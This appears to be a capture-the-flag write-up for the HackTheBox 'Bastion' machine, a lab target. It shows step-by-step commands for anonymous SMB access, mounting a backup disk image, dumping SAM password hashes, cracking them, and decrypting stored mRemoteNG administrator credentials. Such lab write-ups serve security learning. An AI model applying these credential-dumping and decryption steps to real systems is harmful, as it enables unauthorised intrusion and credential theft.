<img src="Machines/Bastion/Images/1.PNG">
##Intro 
Target: 10.10.10.134

It's a easy box and I will be using kali linux for solving this.
##Steps
####1. Info Gathering
First, Run a nmap scan to see open ports and services.
```
root@kali:~/CTF# nmap -sC -sV 10.10.10.134
```
And here are the results:
```
Starting Nmap 7.80 ( https://nmap.org ) at 2019-09-08 08:56 EDT
Nmap scan report for 10.10.10.134
Host is up (0.29s latency).
Not shown: 996 closed ports
PORT    STATE SERVICE      VERSION
22/tcp  open  ssh          OpenSSH for_Windows_7.9 (protocol 2.0)
| ssh-hostkey: 
|   2048 3a:56:ae:75:3c:78:0e:c8:56:4d:cb:1c:22:bf:45:8a (RSA)
|   256 cc:2e:56:ab:19:97:d5:bb:03:fb:82:cd:63:da:68:01 (ECDSA)
|_  256 93:5f:5d:aa:ca:9f:53:e7:f2:82:e6:64:a8:a3:a0:18 (ED25519)
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -39m21s, deviation: 1h09m15s, median: 37s
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: Bastion
|   NetBIOS computer name: BASTION\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2019-09-08T14:57:33+02:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2019-09-08T12:57:34
|_  start_date: 2019-09-08T11:52:23

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.28 seconds
```
From the open ports, It can be known that the box is a windows machine and we can see its servies. So lets jump right into the fun part. 

####2. Exploitation
There seem to nothing special.Let's try smb service for the port 445. For mb service exploitation in kali, we use smbmap, smbclient, enum4linux, etc.

Lets try smbclient:
```
smbclient -L 10.10.10.134
```
<img src="Machines/Bastion/Images/2.PNG">

With this tool we can see smb shares of this box without any password. Try accessing some shares by 
```smbclient -L //10.10.10.134/**insert sharename here**```. In this case, you can acces **Backups** :
```
root@kali:~/CTF# smbclient //10.10.10.134/Backups

```
<img src="Machines/Bastion/Images/3.PNG">

Voila! We got a shell now.So lets see what we have in here. Now lets see what twe got in there.

4
Content of note.txt:
```
Sysadmins: please don't transfer the entire backup file locally, the VPN to the subsidiary office is too slow.
```
Now let's mount that backup folder.

```
mount -t cifs //10.10.10.134/Backups -o user=guest,password= mnt/backups
````
And we will see around what it has

```
root@kali:~/CTF/bastion/mnt/Backups/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351# ls
9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd
9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd
BackupSpecs.xml
cd113385-65ff-4ea2-8ced-5630f6feca8f_AdditionalFilesc3b9f3c7-5e52-4d5e-8b20-19adc95a34c7.xml
cd113385-65ff-4ea2-8ced-5630f6feca8f_Components.xml
cd113385-65ff-4ea2-8ced-5630f6feca8f_RegistryExcludes.xml
cd113385-65ff-4ea2-8ced-5630f6feca8f_Writer4dc3bdd4-ab48-4d07-adb0-3bee2926fd7f.xml
cd113385-65ff-4ea2-8ced-5630f6feca8f_Writer542da469-d3e1-473c-9f4f-7847f01fc64f.xml
cd113385-65ff-4ea2-8ced-5630f6feca8f_Writera6ad56c2-b509-4e6c-bb19-49d8f43532f0.xml
cd113385-65ff-4ea2-8ced-5630f6feca8f_Writerafbab4a2-367d-4d15-a586-71dbb18f8485.xml
cd113385-65ff-4ea2-8ced-5630f6feca8f_Writerbe000cbe-11fe-4426-9c58-531aa6355fc4.xml
cd113385-65ff-4ea2-8ced-5630f6feca8f_Writercd3f2362-8bef-46c7-9181-d62844cdc0b2.xml
```
Now lets mount the VHD. VHD - Virtual Hard Drive 
```
guestmount --add /mnt/backups/WindowsImageBackup/L4mpje-PC/Backup\ 2019-02-22\ 124351/9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd --inspector --ro /mnt/vhd
```
Now lets see whats around there

```
root@kali:CTF/bastion/mnt/vhd# ls -la           
total 2096745
drwxrwxrwx 1 root root      12288 Feb 22  2019  .
drwxr-xr-x 4 root root       4096 Sep  6 15:25  ..
drwxrwxrwx 1 root root          0 Feb 22  2019 '$Recycle.Bin'
-rwxrwxrwx 1 root root         24 Jun 11  2009  autoexec.bat
-rwxrwxrwx 1 root root         10 Jun 11  2009  config.sys
lrwxrwxrwx 2 root root         14 Jul 14  2009 'Documents and Settings' -> /mnt/vhd/Users
-rwxrwxrwx 1 root root 2147016704 Feb 22  2019  pagefile.sys
drwxrwxrwx 1 root root          0 Jul 14  2009  PerfLogs
drwxrwxrwx 1 root root       4096 Jul 14  2009  ProgramData
drwxrwxrwx 1 root root       4096 Apr 12  2011 'Program Files'
drwxrwxrwx 1 root root          0 Feb 22  2019  Recovery
drwxrwxrwx 1 root root       4096 Feb 22  2019 'System Volume Information'
drwxrwxrwx 1 root root       4096 Feb 22  2019  Users
drwxrwxrwx 1 root root      16384 Feb 22  2019  Windows
```
As I could not find user.txt. So we do this now:
```
root@kali:~CTF/bastion/mnt/vhd# samdump2 ./SYSTEM ./SAM 
*disabled* Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
*disabled* Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::
```
Now lets Drop that sweet hash ```26112010952d963c8dc4217daec986d9``` in hashcat or you can use some online tools to identify and decrypt the hash. I recommend using hashes.org.And we get the password for the user L4mpje-PC,Now lets login as that particular user in ssh.

<img src="Machines/Bastion/Images/5.PNG">

#### 3. Getting user flag
Fire up the terminal and using ssh login as L4mpje. So the sweet terminal is working and it's a childs play to get the hash so yeah.

<img src="Machines/Bastion/Images/6.PNG">

<img src="Machines/Bastion/Images/7.PNG">

Now let's proceed to privillege escalation **My favourite part**

#### 4. Privillege Escalation
After screwing around and raging, I found a intresting program installed by that particular user on appdata 'mRemoteNG'.So, after checking that out I found a confCons.xml and looked whats in it and voila I found the Administrator creds!! Lets drop that hash in a tool that some one has put it out for us. <a href="https://github.com/kmahyyg/mremoteng-decrypt/blob/master/mremoteng_decrypt.py"> mremoteng-decrypt </a>

<img src="Machines/Bastion/Images/8.PNG">

<img src="Machines/Bastion/Images/9.PNG">

<img src="Machines/Bastion/Images/10.PNG">

```
java -jar decipher_mremoteng.jar "aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==" 
```
Now we go the admin creds, Lets login and get the flag.  

<img src="Machines/Bastion/Images/11.PNG">

<img src="Machines/Bastion/Images/12.PNG">

See its # **Easy peasy**

